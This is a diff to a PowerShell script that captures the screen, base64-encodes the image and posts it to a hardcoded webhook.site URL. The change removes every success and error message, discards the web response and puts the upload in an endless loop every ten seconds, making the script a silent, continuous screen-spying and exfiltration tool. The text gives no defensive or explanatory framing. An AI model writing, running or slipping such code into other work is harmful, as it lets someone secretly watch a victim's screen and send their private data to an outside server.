@@ -30,15 +30,19 @@ function Send-ScreenCaptureToWebhook {
             # Send the base64 string to the webhook
             $body = @{ "image" = $base64Image } | ConvertTo-Json
 
-            Invoke-WebRequest -Uri $WebhookUrl -Method Post -Body $body -ContentType "application/json"
+            $null = Invoke-WebRequest -Uri $WebhookUrl -Method Post -Body $body -ContentType "application/json"
 
-            Write-Host "Screenshot sent successfully."
+            # Write-Host "Screenshot sent successfully."
 
         } catch {
-            Write-Error "Failed to send screenshot: $_"
+            # Write-Error "Failed to send screenshot: $_"
         }
     }
 }
 
 $webhook = "https://webhook.site/2911c139-ed87-4411-a940-58458f44ebb1"
-Send-ScreenCaptureToWebhook -WebhookUrl $webhook
+
+while ($true) {
+    Send-ScreenCaptureToWebhook -WebhookUrl $webhook
+    Start-Sleep -Seconds 10
+}
